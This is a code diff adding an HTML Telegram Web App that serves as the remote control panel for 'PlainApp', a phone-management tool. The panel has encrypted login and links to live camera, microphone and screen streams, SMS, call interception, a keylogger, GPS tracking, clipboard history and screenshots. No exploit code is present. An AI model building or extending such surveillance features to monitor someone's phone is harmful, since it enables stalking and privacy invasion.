@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>PlainApp Control</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    :root {
+      --bg:     var(--tg-theme-bg-color,           #0f0f0f);
+      --text:   var(--tg-theme-text-color,         #ffffff);
+      --hint:   var(--tg-theme-hint-color,         #8e8e93);
+      --link:   var(--tg-theme-link-color,         #0a84ff);
+      --btn:    var(--tg-theme-button-color,       #0a84ff);
+      --btext:  var(--tg-theme-button-text-color,  #ffffff);
+      --sec:    var(--tg-theme-secondary-bg-color, #1c1c1e);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    html, body { height: 100%; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      overscroll-behavior: none;
+    }
+
+    .screen { display: none; }
+    .screen.active { display: flex; }
+
+    /* ── LOGIN ────────────────────────────────────────────── */
+    #s-login {
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 32px 24px;
+      gap: 14px;
+    }
+    .app-icon {
+      width: 80px; height: 80px;
+      background: linear-gradient(135deg, #0a84ff, #5e5ce6);
+      border-radius: 22px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 38px;
+      margin-bottom: 4px;
+      box-shadow: 0 8px 32px rgba(10,132,255,0.4);
+    }
+    .app-name  { font-size: 26px; font-weight: 700; letter-spacing: -0.5px; }
+    .app-sub   { font-size: 14px; color: var(--hint); text-align: center; line-height: 1.5; }
+    .field { width: 100%; max-width: 320px; }
+    .field input {
+      width: 100%;
+      padding: 14px 16px;
+      background: var(--sec);
+      border: 1.5px solid transparent;
+      border-radius: 13px;
+      color: var(--text);
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .field input:focus { border-color: var(--btn); }
+    .err { color: #ff453a; font-size: 13px; text-align: center; min-height: 18px; }
+    .btn-main {
+      width: 100%; max-width: 320px;
+      padding: 15px;
+      background: var(--btn); color: var(--btext);
+      border: none; border-radius: 13px;
+      font-size: 16px; font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.15s, transform 0.1s;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .btn-main:active { transform: scale(0.97); opacity: 0.85; }
+    .btn-main:disabled { opacity: 0.45; }
+    .spin {
+      width: 18px; height: 18px;
+      border: 2px solid rgba(255,255,255,0.35); border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.55s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── CONFIRM OVERLAY ──────────────────────────────────── */
+    #overlay-confirm {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.72);
+      display: none; align-items: flex-end; justify-content: center;
+      padding: 20px; z-index: 200;
+    }
+    #overlay-confirm.show { display: flex; }
+    .sheet {
+      background: var(--sec); border-radius: 22px;
+      padding: 28px 24px; max-width: 380px; width: 100%;
+      text-align: center;
+    }
+    .sheet h3 { font-size: 19px; font-weight: 700; margin-bottom: 10px; }
+    .sheet p  { font-size: 14px; color: var(--hint); line-height: 1.55; }
+    .sheet .cancel-btn {
+      margin-top: 20px; padding: 13px;
+      background: rgba(255,69,58,0.18); color: #ff453a;
+      border: none; border-radius: 12px; width: 100%;
+      font-size: 15px; font-weight: 600; cursor: pointer;
+    }
+
+    /* ── DASHBOARD ────────────────────────────────────────── */
+    #s-dash {
+      flex-direction: column;
+      padding: 16px 14px 40px;
+      gap: 18px;
+      min-height: 100vh;
+    }
+    .header {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 4px 2px;
+    }
+    .header-title { font-size: 22px; font-weight: 700; letter-spacing: -0.5px; }
+    .conn-pill {
+      display: flex; align-items: center; gap: 6px;
+      background: var(--sec); padding: 6px 12px;
+      border-radius: 20px; font-size: 12px; font-weight: 500;
+    }
+    .dot { width: 7px; height: 7px; border-radius: 50%; background: #30d158; flex-shrink: 0; }
+    .dot.red { background: #ff453a; }
+    .sec-label {
+      font-size: 11px; font-weight: 700;
+      color: var(--hint); text-transform: uppercase; letter-spacing: 0.8px;
+    }
+
+    /* live cards */
+    .live-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 9px; }
+    .live-card {
+      border-radius: 16px;
+      padding: 14px 8px 12px;
+      display: flex; flex-direction: column; align-items: center; gap: 8px;
+      cursor: pointer;
+      transition: transform 0.14s, opacity 0.14s;
+      position: relative; overflow: hidden;
+      background: var(--sec);
+    }
+    .live-card:active { transform: scale(0.94); opacity: 0.8; }
+    .live-card.cam  { background: linear-gradient(145deg, #0d2d3d 0%, var(--sec) 100%); }
+    .live-card.mic  { background: linear-gradient(145deg, #1e0d35 0%, var(--sec) 100%); }
+    .live-card.scr  { background: linear-gradient(145deg, #0d1c30 0%, var(--sec) 100%); }
+    .live-icon { font-size: 30px; line-height: 1; }
+    .live-label { font-size: 11px; font-weight: 700; text-align: center; }
+    .live-badge {
+      position: absolute; top: 7px; right: 7px;
+      background: #ff453a; color: #fff;
+      font-size: 8.5px; font-weight: 800; letter-spacing: 0.5px;
+      padding: 2px 5px; border-radius: 5px;
+    }
+
+    /* grid cards */
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 9px; }
+    .gcard {
+      background: var(--sec); border-radius: 16px;
+      padding: 14px 12px;
+      display: flex; align-items: center; gap: 11px;
+      cursor: pointer;
+      transition: transform 0.14s, opacity 0.14s;
+    }
+    .gcard:active { transform: scale(0.96); opacity: 0.78; }
+    .gcard-icon {
+      width: 42px; height: 42px; border-radius: 11px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 21px; flex-shrink: 0;
+    }
+    .gcard-name { font-size: 13px; font-weight: 600; line-height: 1.2; }
+    .gcard-desc { font-size: 11px; color: var(--hint); margin-top: 2px; }
+
+    .ib  { background: rgba(10,132,255,0.18); }
+    .ig  { background: rgba(48,209,88,0.18); }
+    .ip  { background: rgba(175,82,222,0.18); }
+    .io  { background: rgba(255,159,10,0.18); }
+    .ir  { background: rgba(255,69,58,0.18); }
+    .it  { background: rgba(90,200,250,0.18); }
+    .iy  { background: rgba(255,214,10,0.18); }
+    .ipk { background: rgba(255,55,95,0.18); }
+    .iw  { background: rgba(255,255,255,0.12); }
+    .im  { background: rgba(100,210,255,0.18); }
+
+    .logout-row { display: flex; justify-content: center; }
+    .logout-btn {
+      padding: 10px 28px;
+      background: rgba(255,69,58,0.13); color: #ff453a;
+      border: none; border-radius: 10px;
+      font-size: 13px; font-weight: 600; cursor: pointer;
+    }
+    .logout-btn:active { opacity: 0.6; }
+  </style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="s-login" class="screen">
+  <div class="app-icon">🔒</div>
+  <div class="app-name">PlainApp Control</div>
+  <div class="app-sub">Enter your PlainApp password<br>to access live device controls</div>
+  <div class="field">
+    <input type="password" id="pw-input" placeholder="Enter password" autocomplete="current-password">
+  </div>
+  <div class="err" id="login-err"></div>
+  <button class="btn-main" id="login-btn">Unlock</button>
+</div>
+
+<!-- CONFIRM ON PHONE -->
+<div id="overlay-confirm">
+  <div class="sheet">
+    <h3>🔐 Confirm on Phone</h3>
+    <p>A confirmation request was sent to your device.<br>Approve it on the phone screen to continue.</p>
+    <button class="cancel-btn" id="cancel-btn">Cancel</button>
+  </div>
+</div>
+
+<!-- DASHBOARD -->
+<div id="s-dash" class="screen">
+
+  <div class="header">
+    <div class="header-title">PlainApp</div>
+    <div class="conn-pill">
+      <div class="dot" id="conn-dot"></div>
+      <span id="conn-text">Online</span>
+    </div>
+  </div>
+
+  <div class="sec-label">Live Streaming</div>
+  <div class="live-row">
+    <div class="live-card cam" data-path="/live-camera">
+      <div class="live-badge">LIVE</div>
+      <div class="live-icon">📷</div>
+      <div class="live-label">Camera</div>
+    </div>
+    <div class="live-card mic" data-path="/live-mic">
+      <div class="live-badge">LIVE</div>
+      <div class="live-icon">🎙️</div>
+      <div class="live-label">Microphone</div>
+    </div>
+    <div class="live-card scr" data-path="/screen-mirror">
+      <div class="live-badge">LIVE</div>
+      <div class="live-icon">📺</div>
+      <div class="live-label">Screen</div>
+    </div>
+  </div>
+
+  <div class="sec-label">Communication</div>
+  <div class="grid-2">
+    <div class="gcard" data-path="/messages">
+      <div class="gcard-icon ib">💬</div>
+      <div><div class="gcard-name">SMS</div><div class="gcard-desc">All messages</div></div>
+    </div>
+    <div class="gcard" data-path="/calls">
+      <div class="gcard-icon ig">📞</div>
+      <div><div class="gcard-name">Calls</div><div class="gcard-desc">Call history</div></div>
+    </div>
+    <div class="gcard" data-path="/live-call">
+      <div class="gcard-icon ir">🎧</div>
+      <div><div class="gcard-name">Live Call</div><div class="gcard-desc">Intercept calls</div></div>
+    </div>
+    <div class="gcard" data-path="/call-recordings">
+      <div class="gcard-icon ip">🎵</div>
+      <div><div class="gcard-name">Recordings</div><div class="gcard-desc">Call records</div></div>
+    </div>
+  </div>
+
+  <div class="sec-label">Files &amp; Media</div>
+  <div class="grid-2">
+    <div class="gcard" data-path="/files">
+      <div class="gcard-icon io">📁</div>
+      <div><div class="gcard-name">Files</div><div class="gcard-desc">File manager</div></div>
+    </div>
+    <div class="gcard" data-path="/images">
+      <div class="gcard-icon ip">🖼️</div>
+      <div><div class="gcard-name">Photos</div><div class="gcard-desc">Gallery</div></div>
+    </div>
+    <div class="gcard" data-path="/videos">
+      <div class="gcard-icon ir">🎬</div>
+      <div><div class="gcard-name">Videos</div><div class="gcard-desc">Video gallery</div></div>
+    </div>
+    <div class="gcard" data-path="/audios">
+      <div class="gcard-icon ib">🎵</div>
+      <div><div class="gcard-name">Audio</div><div class="gcard-desc">Audio files</div></div>
+    </div>
+  </div>
+
+  <div class="sec-label">Tracking &amp; Surveillance</div>
+  <div class="grid-2">
+    <div class="gcard" data-path="/tracking-hub/live-location">
+      <div class="gcard-icon it">📍</div>
+      <div><div class="gcard-name">Live Location</div><div class="gcard-desc">GPS tracker</div></div>
+    </div>
+    <div class="gcard" data-path="/tracking-hub/keystrokes">
+      <div class="gcard-icon ir">⌨️</div>
+      <div><div class="gcard-name">Keystrokes</div><div class="gcard-desc">Key logger</div></div>
+    </div>
+    <div class="gcard" data-path="/tracking-hub/screenshots">
+      <div class="gcard-icon iy">📸</div>
+      <div><div class="gcard-name">Screenshots</div><div class="gcard-desc">Auto captures</div></div>
+    </div>
+    <div class="gcard" data-path="/device-hub/intruder-captures">
+      <div class="gcard-icon ipk">👁️</div>
+      <div><div class="gcard-name">Intruder</div><div class="gcard-desc">Unlock attempts</div></div>
+    </div>
+    <div class="gcard" data-path="/tracking-hub/geofencing">
+      <div class="gcard-icon ig">🗺️</div>
+      <div><div class="gcard-name">Geofencing</div><div class="gcard-desc">Zone alerts</div></div>
+    </div>
+    <div class="gcard" data-path="/live-captures">
+      <div class="gcard-icon im">🎞️</div>
+      <div><div class="gcard-name">Live Captures</div><div class="gcard-desc">Recent snaps</div></div>
+    </div>
+  </div>
+
+  <div class="sec-label">Device Control</div>
+  <div class="grid-2">
+    <div class="gcard" data-path="/notifications-log">
+      <div class="gcard-icon iy">🔔</div>
+      <div><div class="gcard-name">Notifications</div><div class="gcard-desc">All notifs</div></div>
+    </div>
+    <div class="gcard" data-path="/apps">
+      <div class="gcard-icon iw">📦</div>
+      <div><div class="gcard-name">Apps</div><div class="gcard-desc">Installed apps</div></div>
+    </div>
+    <div class="gcard" data-path="/device-hub/clipboard-manager">
+      <div class="gcard-icon ib">📋</div>
+      <div><div class="gcard-name">Clipboard</div><div class="gcard-desc">Copy history</div></div>
+    </div>
+    <div class="gcard" data-path="/device-hub/battery">
+      <div class="gcard-icon ig">🔋</div>
+      <div><div class="gcard-name">Battery</div><div class="gcard-desc">Power status</div></div>
+    </div>
+    <div class="gcard" data-path="/device-hub/wifi">
+      <div class="gcard-icon ib">📶</div>
+      <div><div class="gcard-name">Wi-Fi</div><div class="gcard-desc">Network info</div></div>
+    </div>
+    <div class="gcard" data-path="/device-hub/process-manager">
+      <div class="gcard-icon io">⚙️</div>
+      <div><div class="gcard-name">Processes</div><div class="gcard-desc">Running apps</div></div>
+    </div>
+    <div class="gcard" data-path="/tracking-hub/accelerometer">
+      <div class="gcard-icon ip">📱</div>
+      <div><div class="gcard-name">Sensors</div><div class="gcard-desc">Accelerometer</div></div>
+    </div>
+    <div class="gcard" data-path="/device-hub/lock-power">
+      <div class="gcard-icon ir">🔒</div>
+      <div><div class="gcard-name">Lock/Power</div><div class="gcard-desc">Screen control</div></div>
+    </div>
+  </div>
+
+  <div class="logout-row">
+    <button class="logout-btn" id="logout-btn">Sign Out</button>
+  </div>
+</div>
+
+<script type="module">
+import { xchacha20poly1305 } from 'https://esm.sh/@noble/ciphers@1.3.0/chacha'
+import { randomBytes } from 'https://esm.sh/@noble/ciphers@1.3.0/webcrypto'
+
+// ── Telegram WebApp ──────────────────────────────────────────────────────────
+const tg = window.Telegram?.WebApp
+if (tg) {
+  tg.ready()
+  tg.expand()
+  tg.enableClosingConfirmation()
+}
+
+// ── Helpers ──────────────────────────────────────────────────────────────────
+const $ = id => document.getElementById(id)
+
+function show(id) { $(id)?.classList.add('active') }
+function hide(id) { $(id)?.classList.remove('active') }
+
+// ── Crypto ───────────────────────────────────────────────────────────────────
+function tokenToKey(token) {
+  return Uint8Array.from(atob(token), c => c.charCodeAt(0))
+}
+function hashToKey(hash) {
+  return new Uint8Array(hash.substring(0, 32).split('').map(c => c.charCodeAt(0)))
+}
+async function sha512(s) {
+  const buf = await crypto.subtle.digest('SHA-512', new TextEncoder().encode(s))
+  return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('')
+}
+function encrypt(key, plaintext) {
+  const nonce = randomBytes(24)
+  const k = new Uint8Array(32); k.set(key.slice(0, 32))
+  const ct = xchacha20poly1305(k, nonce).encrypt(new TextEncoder().encode(plaintext))
+  const out = new Uint8Array(nonce.length + ct.length)
+  out.set(nonce); out.set(ct, nonce.length)
+  return out
+}
+function decrypt(key, data) {
+  const k = new Uint8Array(32); k.set(key.slice(0, 32))
+  return new TextDecoder().decode(xchacha20poly1305(k, data.slice(0, 24)).decrypt(data.slice(24)))
+}
+
+// ── State ────────────────────────────────────────────────────────────────────
+const HOST    = window.location.host
+const PROTO   = window.location.protocol === 'https:' ? 'wss' : 'ws'
+let clientId  = localStorage.getItem('client_id')
+if (!clientId) { clientId = crypto.randomUUID(); localStorage.setItem('client_id', clientId) }
+
+// ── Connection badge ─────────────────────────────────────────────────────────
+function setConn(online) {
+  const dot = $('conn-dot'), txt = $('conn-text')
+  if (!dot || !txt) return
+  dot.className = 'dot' + (online ? '' : ' red')
+  txt.textContent = online ? 'Online' : 'Offline'
+}
+
+// ── Screens ───────────────────────────────────────────────────────────────────
+function openDash() {
+  hide('s-login'); show('s-dash')
+  if (tg) {
+    tg.BackButton.show()
+    tg.BackButton.onClick(() => tg.close())
+  }
+  pingServer()
+}
+function openLogin() {
+  hide('s-dash'); show('s-login')
+  if (tg) tg.BackButton.hide()
+}
+
+async function pingServer() {
+  try {
+    const token = localStorage.getItem('auth_token') ?? ''
+    const key   = tokenToKey(token)
+    const r     = await fetch(`${window.location.origin}/init`, {
+      method: 'POST',
+      headers: { 'c-id': clientId },
+      body: encrypt(key, crypto.randomUUID()),
+    })
+    setConn(r.ok)
+    if (r.status === 401) { logout() }
+  } catch { setConn(false) }
+}
+
+// ── Boot ─────────────────────────────────────────────────────────────────────
+if (localStorage.getItem('auth_token')) openDash(); else openLogin()
+
+// ── Login ─────────────────────────────────────────────────────────────────────
+let loginWs = null
+
+async function doLogin() {
+  const pass = ($('pw-input')?.value ?? '').trim()
+  if (!pass) return
+  const btn = $('login-btn'), errEl = $('login-err')
+  btn.disabled = true
+  btn.innerHTML = '<div class="spin"></div>'
+  errEl.textContent = ''
+
+  const hash = await sha512(pass)
+  const key  = hashToKey(hash)
+
+  loginWs = new WebSocket(`${PROTO}://${HOST}?cid=${clientId}&auth=1`)
+  loginWs.binaryType = 'arraybuffer'
+
+  loginWs.onopen = () => {
+    loginWs.send(encrypt(key, JSON.stringify({
+      password: hash, browserName: 'Telegram', browserVersion: '1.0',
+      osName: 'Android', osVersion: '10', isMobile: true,
+    })))
+  }
+  loginWs.onmessage = async (e) => {
+    const r = JSON.parse(decrypt(key, new Uint8Array(e.data)))
+    if (r.status === 'PENDING') {
+      $('overlay-confirm').classList.add('show')
+      btn.disabled = false; btn.textContent = 'Unlock'
+    } else {
+      localStorage.setItem('auth_token', r.token)
+      $('overlay-confirm').classList.remove('show')
+      loginWs.close()
+      openDash()
+    }
+  }
+  loginWs.onclose = (e) => {
+    btn.disabled = false; btn.textContent = 'Unlock'
+    if (e.reason === 'abort' || e.reason === 'OK') return
+    errEl.textContent = e.reason ? `Error: ${e.reason}` : 'Connection failed'
+  }
+  loginWs.onerror = () => {
+    btn.disabled = false; btn.textContent = 'Unlock'
+    errEl.textContent = 'Could not reach device'
+  }
+  setTimeout(() => { if (loginWs?.readyState !== 1) loginWs?.close(3001, 'timeout') }, 8000)
+}
+
+$('login-btn').addEventListener('click', doLogin)
+$('pw-input').addEventListener('keydown', e => { if (e.key === 'Enter') doLogin() })
+$('cancel-btn').addEventListener('click', () => {
+  $('overlay-confirm').classList.remove('show')
+  loginWs?.close(3001, 'abort')
+})
+
+// ── Logout ────────────────────────────────────────────────────────────────────
+function logout() { localStorage.removeItem('auth_token'); openLogin() }
+$('logout-btn').addEventListener('click', logout)
+
+// ── Card navigation ───────────────────────────────────────────────────────────
+document.querySelectorAll('[data-path]').forEach(card => {
+  card.addEventListener('click', () => {
+    const path = card.getAttribute('data-path')
+    if (path) window.location.href = path
+  })
+})
+</script>
+</body>
+</html>
